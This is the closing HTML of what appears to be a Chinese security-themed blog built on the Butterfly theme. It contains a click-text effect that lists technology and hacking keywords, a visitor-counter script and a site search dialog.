</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="Java,Python,PHP,Node,Golang,C#,Tomcat,Apache,SqlInjection,SSTI,LFI,XSS,Nmap,BurpSuite,Hack,Docker" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>